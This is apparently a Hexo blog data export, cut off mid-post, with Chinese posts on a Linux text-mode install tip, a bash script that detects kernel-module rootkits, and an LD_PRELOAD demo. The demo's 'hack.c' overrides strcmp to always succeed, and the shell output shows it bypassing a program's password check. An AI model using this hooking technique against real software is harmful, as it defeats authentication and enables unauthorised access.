老版本的时候，由于相应的驱动比较老（），没有办法安装。</p><p>最后没有办法，都是用硬盘或者U盘安装，相应安装本博客已经写过了。</p><p>因为硬盘安装直接进入图形界面，中也有一个选项use text mode 。</p><p>跳过后，进入linux图形安装界面，主板显卡如果比较新的话，不被识别，就会花屏。</p><p>使用USE text mode 选型，很好。安装了好几次，都没有在意这个选项。</p><p>切记，切记。</p><p>&nbsp;</p><p><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /></p>","slug":"linux-安装-use-text-mode选项","published":1,"updated":"2023-04-22T05:38:44.799Z","_id":"clgrjlxgb00387opi0snr7ku8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>use text mode 选项 被忽略了 。气人、、<img src=\"/images/pic/other_site/img_baidu_j_0016.gif\" /></p><p>&nbsp;</p><p>安装linux 老版本的时候，由于相应的驱动比较老（），没有办法安装。</p><p>最后没有办法，都是用硬盘或者U盘安装，相应安装本博客已经写过了。</p><p>因为硬盘安装直接进入图形界面，中也有一个选项use text mode 。</p><p>跳过后，进入linux图形安装界面，主板显卡如果比较新的话，不被识别，就会花屏。</p><p>使用USE text mode 选型，很好。安装了好几次，都没有在意这个选项。</p><p>切记，切记。</p><p>&nbsp;</p><p><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /></p>","site":{"data":{}},"excerpt":"","more":"<p>use text mode 选项 被忽略了 。气人、、<img src=\"/images/pic/other_site/img_baidu_j_0016.gif\" /></p><p>&nbsp;</p><p>安装linux 老版本的时候，由于相应的驱动比较老（），没有办法安装。</p><p>最后没有办法，都是用硬盘或者U盘安装，相应安装本博客已经写过了。</p><p>因为硬盘安装直接进入图形界面，中也有一个选项use text mode 。</p><p>跳过后，进入linux图形安装界面，主板显卡如果比较新的话，不被识别，就会花屏。</p><p>使用USE text mode 选型，很好。安装了好几次，都没有在意这个选项。</p><p>切记，切记。</p><p>&nbsp;</p><p><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /><img src=\"/images/pic/other_site/img_baidu_j_0012.gif\" /></p>"},{"title":"linux 内核模块(LKM)检测工具","date":"2011-12-29T03:26:00.000Z","_content":"在生产环境中，系统被入侵后，黑客会放置自己的后门。LKM后门和传统的后门不一样，它可以通过隐藏进程、端口、文件的方式隐藏自己，不被管理员轻易发现，也就是常说的rootkit技术。<br />LKM是什么？load kernel module，可加载内核模块的缩写。<br />xlkm一个脚本，通过对准上线机器现加载内核模块进行备份，来判别模块是否替换、篡改。<br />主要思路就是：列出系统加载的内核模块并备份，对现加载的模块的md5校验并备份其信息，然后进行对比。<br /><p>实现起来比较简单，我shell也不是很好，大家就凑活着看吧。</p><p>&nbsp;</p><p></p><p>#!/bin/bash</p><p>&nbsp;</p><p>#code:key1088</p><p>#mail:key1088@163.com</p><p>#bash --version</p><p>#GNU bash, version 3.2.25(1)-release (i686-redhat-linux-gnu)</p><p>#Copyright (C) 2005 Free Software Foundation, Inc</p><p>&nbsp;</p><p>if [ $(whoami) != &quot;root&quot; ];</p><p>then</p><p>echo &quot;Not root&quot;</p><p>exit 0</p><p>fi</p><p>&nbsp;</p><p>xlkmroot=/usr/local/xlkm</p><p>&nbsp;</p><p>help(){</p><p>echo -e &quot; 33[32m List:&quot;</p><p>echo &quot;[1.Start LKM List Backup]&quot;</p><p>echo &quot;[2.Test LKM List Change]&quot;</p><p>echo &quot;[3.Delete All Backup]&quot;</p><p>echo &quot;[4.Quit]&quot;</p><p>echo -e &quot; 33[0m&quot;</p><p>}</p><p>&nbsp;</p><p>SETUPXLKM(){</p><p>if test -d $xlkmroot ;then</p><p>echo &quot;LKM exist Backup!!&quot;</p><p>exit 1</p><p>fi</p><p>mkdir $xlkmroot</p><p>chmod 700 $xlkmroot</p><p>}</p><p>&nbsp;</p><p>DELXLKM(){</p><p>rm -rf $xlkmroot</p><p>echo</p><p>echo -e &quot; 33[34mDelete XLKM Backup Sccessfully 33[0m&quot;</p><p>echo</p><p>}</p><p>&nbsp;</p><p>START(){</p><p>while [ -z $passwd ]</p><p>do</p><p>echo</p><p>echo -n &quot;Input encrypt passwd[No Null]:&quot;</p><p>read passwd</p><p>done</p><p>echo &quot;WAITing.....&quot;</p><p>lsmod &gt; $xlkmroot/lkmlist.main</p><p>for i in $(modprobe -l)</p><p>do</p><p>md5sum $i &gt;&gt; $xlkmroot/lkmfile.md5.main</p><p>done</p><p>cd $xlkmroot</p><p>zip -P $passwd mainfile.zip ./*.main &gt; /dev/null</p><p>rc=$?</p><p>if [ &quot;$rc&quot; == 0 ];</p><p>then</p><p>echo</p><p>echo -e &quot; 33[34mLKM List Backup Successfully! 33[0m&quot;</p><p>echo&nbsp;</p><p>else</p><p>echo</p><p>echo -e &quot; 33[34mBeijule! Error! 33[0m&quot;</p><p>echo&nbsp;</p><p>fi</p><p>rm -f $xlkmroot/lkm* &gt; /dev/null</p><p>}</p><p>&nbsp;</p><p>LKMCHANGE(){</p><p>echo &quot;Test LKM Change&quot;</p><p>&nbsp;</p><p>cd $xlkmroot</p><p>while [ &quot;$ra&quot; != 0 ]</p><p>do</p><p>echo</p><p>echo -n &quot;Input encrypt passwd[No Null]:&quot;</p><p>read passwd</p><p>unzip -P $passwd mainfile.zip &gt; /dev/null 2&gt;&amp;1</p><p>ra=$?</p><p>if [ &quot;$ra&quot; != 0 ];then echo &quot;Invalid password!! &quot;; fi</p><p>done</p><p>echo &quot;WAITing.....&quot;</p><p>lsmod &gt; $xlkmroot/lkmlist.new</p><p>for i in $(modprobe -l)</p><p>do</p><p>md5sum $i &gt;&gt; $xlkmroot/lkmfile.md5.new</p><p>done</p><p>echo &quot;LKM List Change:&quot;</p><p>echo -e &quot; 33[31m&quot;</p><p>diff $xlkmroot/lkmlist.main $xlkmroot/lkmlist.new</p><p>echo -e &quot; 33[0m&quot;</p><p>echo &quot;LKM File Md5 Change:&quot;</p><p>echo -e &quot; 33[31m&quot;</p><p>diff $xlkmroot/lkmfile.md5.main $xlkmroot/lkmfile.md5.new</p><p>echo -e &quot; 33[0m&quot;</p><p>rm -f *.new *.main</p><p>&nbsp;</p><p>}</p><p>&nbsp;</p><p>while :</p><p>do</p><p>&nbsp;</p><p>help</p><p>echo -n &quot;Input List num:&quot;</p><p>read x</p><p>&nbsp;</p><p>case &quot;$x&quot; in</p><p>1)</p><p>SETUPXLKM</p><p>START</p><p>;;</p><p>2)</p><p>LKMCHANGE</p><p>;;</p><p>3)</p><p>DELXLKM</p><p>;;</p><p>4)</p><p>exit 0</p><p>;;</p><p>*)</p><p>echo -e &quot; 33[31mError !!!!!&quot;</p><p>echo -e &quot;Pleae input [1-4] list option  33[0m&quot;</p><p>;;</p><p>esac</p><p>&nbsp;</p><p>done</p><p>&nbsp;</p><em></em><p></p>","source":"_posts/linux-内核模块(LKM)检测工具.md","raw":"title: linux 内核模块(LKM)检测工具\ncategories: [网络安全]\ntags: []\ndate: 2011-12-29 11:26:00\n---\n在生产环境中，系统被入侵后，黑客会放置自己的后门。LKM后门和传统的后门不一样，它可以通过隐藏进程、端口、文件的方式隐藏自己，不被管理员轻易发现，也就是常说的rootkit技术。<br />LKM是什么？load kernel module，可加载内核模块的缩写。<br />xlkm一个脚本，通过对准上线机器现加载内核模块进行备份，来判别模块是否替换、篡改。<br />主要思路就是：列出系统加载的内核模块并备份，对现加载的模块的md5校验并备份其信息，然后进行对比。<br /><p>实现起来比较简单，我shell也不是很好，大家就凑活着看吧。</p><p>&nbsp;</p><p></p><p>#!/bin/bash</p><p>&nbsp;</p><p>#code:key1088</p><p>#mail:key1088@163.com</p><p>#bash --version</p><p>#GNU bash, version 3.2.25(1)-release (i686-redhat-linux-gnu)</p><p>#Copyright (C) 2005 Free Software Foundation, Inc</p><p>&nbsp;</p><p>if [ $(whoami) != &quot;root&quot; ];</p><p>then</p><p>echo &quot;Not root&quot;</p><p>exit 0</p><p>fi</p><p>&nbsp;</p><p>xlkmroot=/usr/local/xlkm</p><p>&nbsp;</p><p>help(){</p><p>echo -e &quot; 33[32m List:&quot;</p><p>echo &quot;[1.Start LKM List Backup]&quot;</p><p>echo &quot;[2.Test LKM List Change]&quot;</p><p>echo &quot;[3.Delete All Backup]&quot;</p><p>echo &quot;[4.Quit]&quot;</p><p>echo -e &quot; 33[0m&quot;</p><p>}</p><p>&nbsp;</p><p>SETUPXLKM(){</p><p>if test -d $xlkmroot ;then</p><p>echo &quot;LKM exist Backup!!&quot;</p><p>exit 1</p><p>fi</p><p>mkdir $xlkmroot</p><p>chmod 700 $xlkmroot</p><p>}</p><p>&nbsp;</p><p>DELXLKM(){</p><p>rm -rf $xlkmroot</p><p>echo</p><p>echo -e &quot; 33[34mDelete XLKM Backup Sccessfully 33[0m&quot;</p><p>echo</p><p>}</p><p>&nbsp;</p><p>START(){</p><p>while [ -z $passwd ]</p><p>do</p><p>echo</p><p>echo -n &quot;Input encrypt passwd[No Null]:&quot;</p><p>read passwd</p><p>done</p><p>echo &quot;WAITing.....&quot;</p><p>lsmod &gt; $xlkmroot/lkmlist.main</p><p>for i in $(modprobe -l)</p><p>do</p><p>md5sum $i &gt;&gt; $xlkmroot/lkmfile.md5.main</p><p>done</p><p>cd $xlkmroot</p><p>zip -P $passwd mainfile.zip ./*.main &gt; /dev/null</p><p>rc=$?</p><p>if [ &quot;$rc&quot; == 0 ];</p><p>then</p><p>echo</p><p>echo -e &quot; 33[34mLKM List Backup Successfully! 33[0m&quot;</p><p>echo&nbsp;</p><p>else</p><p>echo</p><p>echo -e &quot; 33[34mBeijule! Error! 33[0m&quot;</p><p>echo&nbsp;</p><p>fi</p><p>rm -f $xlkmroot/lkm* &gt; /dev/null</p><p>}</p><p>&nbsp;</p><p>LKMCHANGE(){</p><p>echo &quot;Test LKM Change&quot;</p><p>&nbsp;</p><p>cd $xlkmroot</p><p>while [ &quot;$ra&quot; != 0 ]</p><p>do</p><p>echo</p><p>echo -n &quot;Input encrypt passwd[No Null]:&quot;</p><p>read passwd</p><p>unzip -P $passwd mainfile.zip &gt; /dev/null 2&gt;&amp;1</p><p>ra=$?</p><p>if [ &quot;$ra&quot; != 0 ];then echo &quot;Invalid password!! &quot;; fi</p><p>done</p><p>echo &quot;WAITing.....&quot;</p><p>lsmod &gt; $xlkmroot/lkmlist.new</p><p>for i in $(modprobe -l)</p><p>do</p><p>md5sum $i &gt;&gt; $xlkmroot/lkmfile.md5.new</p><p>done</p><p>echo &quot;LKM List Change:&quot;</p><p>echo -e &quot; 33[31m&quot;</p><p>diff $xlkmroot/lkmlist.main $xlkmroot/lkmlist.new</p><p>echo -e &quot; 33[0m&quot;</p><p>echo &quot;LKM File Md5 Change:&quot;</p><p>echo -e &quot; 33[31m&quot;</p><p>diff $xlkmroot/lkmfile.md5.main $xlkmroot/lkmfile.md5.new</p><p>echo -e &quot; 33[0m&quot;</p><p>rm -f *.new *.main</p><p>&nbsp;</p><p>}</p><p>&nbsp;</p><p>while :</p><p>do</p><p>&nbsp;</p><p>help</p><p>echo -n &quot;Input List num:&quot;</p><p>read x</p><p>&nbsp;</p><p>case &quot;$x&quot; in</p><p>1)</p><p>SETUPXLKM</p><p>START</p><p>;;</p><p>2)</p><p>LKMCHANGE</p><p>;;</p><p>3)</p><p>DELXLKM</p><p>;;</p><p>4)</p><p>exit 0</p><p>;;</p><p>*)</p><p>echo -e &quot; 33[31mError !!!!!&quot;</p><p>echo -e &quot;Pleae input [1-4] list option  33[0m&quot;</p><p>;;</p><p>esac</p><p>&nbsp;</p><p>done</p><p>&nbsp;</p><em></em><p></p>","slug":"linux-内核模块(LKM)检测工具","published":1,"updated":"2023-04-22T05:38:44.793Z","_id":"clgrjlxgd003a7opifrxuaq8k","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在生产环境中，系统被入侵后，黑客会放置自己的后门。LKM后门和传统的后门不一样，它可以通过隐藏进程、端口、文件的方式隐藏自己，不被管理员轻易发现，也就是常说的rootkit技术。<br />LKM是什么？load kernel module，可加载内核模块的缩写。<br />xlkm一个脚本，通过对准上线机器现加载内核模块进行备份，来判别模块是否替换、篡改。<br />主要思路就是：列出系统加载的内核模块并备份，对现加载的模块的md5校验并备份其信息，然后进行对比。<br /><p>实现起来比较简单，我shell也不是很好，大家就凑活着看吧。</p><p>&amp;nbsp;</p><p></p><p>#!&#x2F;bin&#x2F;bash</p><p>&amp;nbsp;</p><p>#code:key1088</p><p>#mail:<a href=\"mailto:&#x6b;&#101;&#121;&#x31;&#x30;&#x38;&#x38;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#x6f;&#109;\">&#x6b;&#101;&#121;&#x31;&#x30;&#x38;&#x38;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#x6f;&#109;</a></p><p>#bash –version</p><p>#GNU bash, version 3.2.25(1)-release (i686-redhat-linux-gnu)</p><p>#Copyright (C) 2005 Free Software Foundation, Inc</p><p>&amp;nbsp;</p><p>if [ $(whoami) !&#x3D; &quot;root&quot; ];</p><p>then</p><p>echo &quot;Not root&quot;</p><p>exit 0</p><p>fi</p><p>&amp;nbsp;</p><p>xlkmroot&#x3D;&#x2F;usr&#x2F;local&#x2F;xlkm</p><p>&amp;nbsp;</p><p>help(){</p><p>echo -e &quot; 33[32m List:&quot;</p><p>echo &quot;[1.Start LKM List Backup]&quot;</p><p>echo &quot;[2.Test LKM List Change]&quot;</p><p>echo &quot;[3.Delete All Backup]&quot;</p><p>echo &quot;[4.Quit]&quot;</p><p>echo -e &quot; 33[0m&quot;</p><p>}</p><p>&amp;nbsp;</p><p>SETUPXLKM(){</p><p>if test -d $xlkmroot ;then</p><p>echo &quot;LKM exist Backup!!&quot;</p><p>exit 1</p><p>fi</p><p>mkdir $xlkmroot</p><p>chmod 700 $xlkmroot</p><p>}</p><p>&amp;nbsp;</p><p>DELXLKM(){</p><p>rm -rf $xlkmroot</p><p>echo</p><p>echo -e &quot; 33[34mDelete XLKM Backup Sccessfully 33[0m&quot;</p><p>echo</p><p>}</p><p>&amp;nbsp;</p><p>START(){</p><p>while [ -z $passwd ]</p><p>do</p><p>echo</p><p>echo -n &quot;Input encrypt passwd[No Null]:&quot;</p><p>read passwd</p><p>done</p><p>echo &quot;WAITing…..&quot;</p><p>lsmod &gt; $xlkmroot&#x2F;lkmlist.main</p><p>for i in $(modprobe -l)</p><p>do</p><p>md5sum $i &gt;&gt; $xlkmroot&#x2F;lkmfile.md5.main</p><p>done</p><p>cd $xlkmroot</p><p>zip -P $passwd mainfile.zip .&#x2F;<em>.main &gt; &#x2F;dev&#x2F;null</p><p>rc&#x3D;$?</p><p>if [ &quot;$rc&quot; &#x3D;&#x3D; 0 ];</p><p>then</p><p>echo</p><p>echo -e &quot; 33[34mLKM List Backup Successfully! 33[0m&quot;</p><p>echo&amp;nbsp;</p><p>else</p><p>echo</p><p>echo -e &quot; 33[34mBeijule! Error! 33[0m&quot;</p><p>echo&amp;nbsp;</p><p>fi</p><p>rm -f $xlkmroot&#x2F;lkm</em> &gt; &#x2F;dev&#x2F;null</p><p>}</p><p>&amp;nbsp;</p><p>LKMCHANGE(){</p><p>echo &quot;Test LKM Change&quot;</p><p>&amp;nbsp;</p><p>cd $xlkmroot</p><p>while [ &quot;$ra&quot; !&#x3D; 0 ]</p><p>do</p><p>echo</p><p>echo -n &quot;Input encrypt passwd[No Null]:&quot;</p><p>read passwd</p><p>unzip -P $passwd mainfile.zip &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</p><p>ra&#x3D;$?</p><p>if [ &quot;$ra&quot; !&#x3D; 0 ];then echo &quot;Invalid password!! &quot;; fi</p><p>done</p><p>echo &quot;WAITing…..&quot;</p><p>lsmod &gt; $xlkmroot&#x2F;lkmlist.new</p><p>for i in $(modprobe -l)</p><p>do</p><p>md5sum $i &gt;&gt; $xlkmroot&#x2F;lkmfile.md5.new</p><p>done</p><p>echo &quot;LKM List Change:&quot;</p><p>echo -e &quot; 33[31m&quot;</p><p>diff $xlkmroot&#x2F;lkmlist.main $xlkmroot&#x2F;lkmlist.new</p><p>echo -e &quot; 33[0m&quot;</p><p>echo &quot;LKM File Md5 Change:&quot;</p><p>echo -e &quot; 33[31m&quot;</p><p>diff $xlkmroot&#x2F;lkmfile.md5.main $xlkmroot&#x2F;lkmfile.md5.new</p><p>echo -e &quot; 33[0m&quot;</p><p>rm -f *.new <em>.main</p><p>&amp;nbsp;</p><p>}</p><p>&amp;nbsp;</p><p>while :</p><p>do</p><p>&amp;nbsp;</p><p>help</p><p>echo -n &quot;Input List num:&quot;</p><p>read x</p><p>&amp;nbsp;</p><p>case &quot;$x&quot; in</p><p>1)</p><p>SETUPXLKM</p><p>START</p><p>;;</p><p>2)</p><p>LKMCHANGE</p><p>;;</p><p>3)</p><p>DELXLKM</p><p>;;</p><p>4)</p><p>exit 0</p><p>;;</p><p></em>)</p><p>echo -e &quot; 33[31mError !!!!!&quot;</p><p>echo -e &quot;Pleae input [1-4] list option  33[0m&quot;</p><p>;;</p><p>esac</p><p>&amp;nbsp;</p><p>done</p><p>&amp;nbsp;</p><em></em><p></p></p>\n","site":{"data":{}},"excerpt":"","more":"<p>在生产环境中，系统被入侵后，黑客会放置自己的后门。LKM后门和传统的后门不一样，它可以通过隐藏进程、端口、文件的方式隐藏自己，不被管理员轻易发现，也就是常说的rootkit技术。<br />LKM是什么？load kernel module，可加载内核模块的缩写。<br />xlkm一个脚本，通过对准上线机器现加载内核模块进行备份，来判别模块是否替换、篡改。<br />主要思路就是：列出系统加载的内核模块并备份，对现加载的模块的md5校验并备份其信息，然后进行对比。<br /><p>实现起来比较简单，我shell也不是很好，大家就凑活着看吧。</p><p>&amp;nbsp;</p><p></p><p>#!&#x2F;bin&#x2F;bash</p><p>&amp;nbsp;</p><p>#code:key1088</p><p>#mail:<a href=\"mailto:&#x6b;&#101;&#121;&#x31;&#x30;&#x38;&#x38;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#x6f;&#109;\">&#x6b;&#101;&#121;&#x31;&#x30;&#x38;&#x38;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#x6f;&#109;</a></p><p>#bash –version</p><p>#GNU bash, version 3.2.25(1)-release (i686-redhat-linux-gnu)</p><p>#Copyright (C) 2005 Free Software Foundation, Inc</p><p>&amp;nbsp;</p><p>if [ $(whoami) !&#x3D; &quot;root&quot; ];</p><p>then</p><p>echo &quot;Not root&quot;</p><p>exit 0</p><p>fi</p><p>&amp;nbsp;</p><p>xlkmroot&#x3D;&#x2F;usr&#x2F;local&#x2F;xlkm</p><p>&amp;nbsp;</p><p>help(){</p><p>echo -e &quot; 33[32m List:&quot;</p><p>echo &quot;[1.Start LKM List Backup]&quot;</p><p>echo &quot;[2.Test LKM List Change]&quot;</p><p>echo &quot;[3.Delete All Backup]&quot;</p><p>echo &quot;[4.Quit]&quot;</p><p>echo -e &quot; 33[0m&quot;</p><p>}</p><p>&amp;nbsp;</p><p>SETUPXLKM(){</p><p>if test -d $xlkmroot ;then</p><p>echo &quot;LKM exist Backup!!&quot;</p><p>exit 1</p><p>fi</p><p>mkdir $xlkmroot</p><p>chmod 700 $xlkmroot</p><p>}</p><p>&amp;nbsp;</p><p>DELXLKM(){</p><p>rm -rf $xlkmroot</p><p>echo</p><p>echo -e &quot; 33[34mDelete XLKM Backup Sccessfully 33[0m&quot;</p><p>echo</p><p>}</p><p>&amp;nbsp;</p><p>START(){</p><p>while [ -z $passwd ]</p><p>do</p><p>echo</p><p>echo -n &quot;Input encrypt passwd[No Null]:&quot;</p><p>read passwd</p><p>done</p><p>echo &quot;WAITing…..&quot;</p><p>lsmod &gt; $xlkmroot&#x2F;lkmlist.main</p><p>for i in $(modprobe -l)</p><p>do</p><p>md5sum $i &gt;&gt; $xlkmroot&#x2F;lkmfile.md5.main</p><p>done</p><p>cd $xlkmroot</p><p>zip -P $passwd mainfile.zip .&#x2F;<em>.main &gt; &#x2F;dev&#x2F;null</p><p>rc&#x3D;$?</p><p>if [ &quot;$rc&quot; &#x3D;&#x3D; 0 ];</p><p>then</p><p>echo</p><p>echo -e &quot; 33[34mLKM List Backup Successfully! 33[0m&quot;</p><p>echo&amp;nbsp;</p><p>else</p><p>echo</p><p>echo -e &quot; 33[34mBeijule! Error! 33[0m&quot;</p><p>echo&amp;nbsp;</p><p>fi</p><p>rm -f $xlkmroot&#x2F;lkm</em> &gt; &#x2F;dev&#x2F;null</p><p>}</p><p>&amp;nbsp;</p><p>LKMCHANGE(){</p><p>echo &quot;Test LKM Change&quot;</p><p>&amp;nbsp;</p><p>cd $xlkmroot</p><p>while [ &quot;$ra&quot; !&#x3D; 0 ]</p><p>do</p><p>echo</p><p>echo -n &quot;Input encrypt passwd[No Null]:&quot;</p><p>read passwd</p><p>unzip -P $passwd mainfile.zip &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</p><p>ra&#x3D;$?</p><p>if [ &quot;$ra&quot; !&#x3D; 0 ];then echo &quot;Invalid password!! &quot;; fi</p><p>done</p><p>echo &quot;WAITing…..&quot;</p><p>lsmod &gt; $xlkmroot&#x2F;lkmlist.new</p><p>for i in $(modprobe -l)</p><p>do</p><p>md5sum $i &gt;&gt; $xlkmroot&#x2F;lkmfile.md5.new</p><p>done</p><p>echo &quot;LKM List Change:&quot;</p><p>echo -e &quot; 33[31m&quot;</p><p>diff $xlkmroot&#x2F;lkmlist.main $xlkmroot&#x2F;lkmlist.new</p><p>echo -e &quot; 33[0m&quot;</p><p>echo &quot;LKM File Md5 Change:&quot;</p><p>echo -e &quot; 33[31m&quot;</p><p>diff $xlkmroot&#x2F;lkmfile.md5.main $xlkmroot&#x2F;lkmfile.md5.new</p><p>echo -e &quot; 33[0m&quot;</p><p>rm -f *.new <em>.main</p><p>&amp;nbsp;</p><p>}</p><p>&amp;nbsp;</p><p>while :</p><p>do</p><p>&amp;nbsp;</p><p>help</p><p>echo -n &quot;Input List num:&quot;</p><p>read x</p><p>&amp;nbsp;</p><p>case &quot;$x&quot; in</p><p>1)</p><p>SETUPXLKM</p><p>START</p><p>;;</p><p>2)</p><p>LKMCHANGE</p><p>;;</p><p>3)</p><p>DELXLKM</p><p>;;</p><p>4)</p><p>exit 0</p><p>;;</p><p></em>)</p><p>echo -e &quot; 33[31mError !!!!!&quot;</p><p>echo -e &quot;Pleae input [1-4] list option  33[0m&quot;</p><p>;;</p><p>esac</p><p>&amp;nbsp;</p><p>done</p><p>&amp;nbsp;</p><em></em><p></p></p>\n"},{"title":"LINUX 设置库优先级变量LD_PRELOAD","date":"2014-04-13T08:20:45.000Z","_content":"在Unix操作系统的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。\n  大家想到着就邪恶了吧，今天看proxychanis代码发现的，和win平台sockscap32类似。\n 看代码test.c\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(void)\n{\n    char *passwd=\"abcd\";\n    char in_buff[10];\n    printf(\"-->input your passwd:\");\n    scanf(\"%s\", in_buff);\n    if( strcmp(passwd,in_buff) != 0) {\n        printf(\"passwd errn\");\n        exit(-1);\n    }\n    printf(\"ok!. open doorn\");\n}\n</pre>\n库代码hack.c\n<pre>\n#include <stdio.h>\nint strcmp(const char *s1, const char *s2)\n{\n    printf(\"hack function invoked. s1=[%s],s2=[%s]n\", s1, s2);\n    return 0;\n}\n</pre>\n<pre>\n[root@localhost preload]# gcc -o test test.c\n[root@localhost preload]# ./test\n-->input your passwd:123\npasswd err\n[root@localhost preload]# gcc -shared -o hack.o hack.c\n[root@localhost preload]# ls -l hack.so\n-rwxr-xr-x 1 root root 4116 Apr 13 15:52 hack.so\n[root@localhost preload]# LD_PRELOAD=\"./hack.so\"\n[root@localhost preload]# ./test\n-->input your passwd:123\npasswd err\n[root@localhost preload]# export LD_PRELOAD=\"./hack.so\"\n[root@localhost preload]# ./test\n-->input your passwd:123\nhack function invoked. s1=[abcd],s2=[123]\nok!. open door\n[root@localhost preload]#\n</pre>\n这是一种思路，还有一种最直接的办法用ltrace\nltrace是跟踪调用库函数的工具\n<pre>\n[root@localhost preload]# export LD_PRELOAD=\n[root@localhost preload]# ltrace ./test\n(0x69951c, 0x699ab0, 0, 0, 0x699e58)                                              = 0x6998e4\n__libc_start_main(0x80484a4, 1, 0xbf948364, 0x8048530, 0x8048520 <unfinished ...>\nprintf(\"-->input your passwd:\")                                                   = 21\n__isoc99_scanf(0x80485ff, 0xbf9482a2, 0x9acce0, 0x9abff4, 0x8048530-->input your passwd:123\n)              = 1\nstrcmp(\"abcd\", \"123\")                                                             = 1\nputs(\"passwd err\"passwd err\n)                                                                = 11\nexit(1 <unfinished ...>\n+++ exited (status 1) +++\n[root@localhost preload]#\n</pre>","source":"_posts/LINUX-设置库优先级变量LD_PRELOAD.md","raw":"title: LINUX 设置库优先级变量LD_PRELOAD\ncategories: [网络安全,Linux,C编程]\ntags: []\ndate: 2014-04-13 16:20:45\n---\n在Unix操作系统的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。\n  大家想到着就邪恶了吧，今天看proxychanis代码发现的，和win平台sockscap32类似。\n 看代码test.c\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(void)\n{\n    char *passwd=\"abcd\";\n    char in_buff[10];\n    printf(\"-->input your passwd:\");\n    scanf(\"%s\", in_buff);\n    if( strcmp(passwd,in_buff) != 0) {\n        printf(\"passwd errn\");\n        exit(-1);\n    }\n    printf(\"ok!. open doorn\");\n}\n</pre>\n库代码hack.c\n<pre>\n#include <stdio.h>\nint strcmp(const char *s1, const char *s2)\n{\n    printf(\"hack function invoked. s1=[%s],s2=[%s]n\", s1, s2);\n    return 0;\n}\n</pre>\n<pre>\n[root@localhost preload]# gcc -o test test.c\n[root@localhost preload]# ./test\n-->input your passwd:123\npasswd err\n[root@localhost preload]# gcc -shared -o hack.o hack.c\n[root@localhost preload]# ls -l hack.so\n-rwxr-xr-x 1 root root 4116 Apr 13 15:52 hack.so\n[root@localhost preload]# LD_PRELOAD=\"./hack.so\"\n[root@localhost preload]# ./test\n-->input your passwd:123\npasswd err\n[root@localhost preload]# export LD_PRELOAD=\"./hack.so\"\n[root@localhost preload]# ./test\n-->input your passwd:123\nhack function invoked. s1=[abcd],s2=[123]\nok!. open door\n[root@localhost preload]#\n</pre>\n这是一种思路，还有一种最直接的办法用ltrace\nltrace是跟踪调用库函数的工具\n<pre>\n[root@localhost preload]# export LD_PRELOAD=\n[root@localhost preload]# ltrace ./test\n(0x69951c, 0x699ab0, 0, 0, 0x699e58)                                              = 0x6998e4\n__libc_start_main(0x80484a4, 1, 0xbf948364, 0x8048530, 0x8048520 <unfinished ...>\nprintf(\"-->input your passwd:\")                                                   = 21\n__isoc99_scanf(0x80485ff, 0xbf9482a2, 0x9acce0, 0x9abff4, 0x8048530-->input your passwd:123\n)              = 1\nstrcmp(\"abcd\", \"123\")                                                             = 1\nputs(\"passwd err\"passwd err\n)                                                                = 11\nexit(1 <unfinished ...>\n+++ exited (status 1) +++\n[root@localhost preload]#\n</pre>","slug":"LINUX-设置库优先级变量LD_PRELOAD","published":1,"updated":"2023-04-22T05:38:44.658Z","_id":"clgrjlxgh003c7opi5cc4cilf","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在Unix操作系统的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。<br>  大家想到着就邪恶了吧，今天看proxychanis代码发现的，和win平台sockscap32类似。<br> 看代码test.c</p>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(void)\n{\n    char *passwd=\"abcd\";\n    char in_buff[10];\n    printf(\"-->input your passwd:\");\n    scanf(\"%s\", in_buff);\n    if( strcmp(passwd,in_buff) != 0) {\n        printf(\"passwd errn\");\n        exit(-1);\n    }\n    printf(\"ok!. open doorn\");\n}\n</pre>\n<p>库代码hack.c</p>\n<pre>\n#include <stdio.h>\nint strcmp(const char *s1, const char *s2)\n{\n    printf(\"hack function invoked. s1=[%s],s2=[%s]n\", s1, s2);\n    return 0;\n}\n</pre>\n<pre>\n[root@localhost preload]# gcc 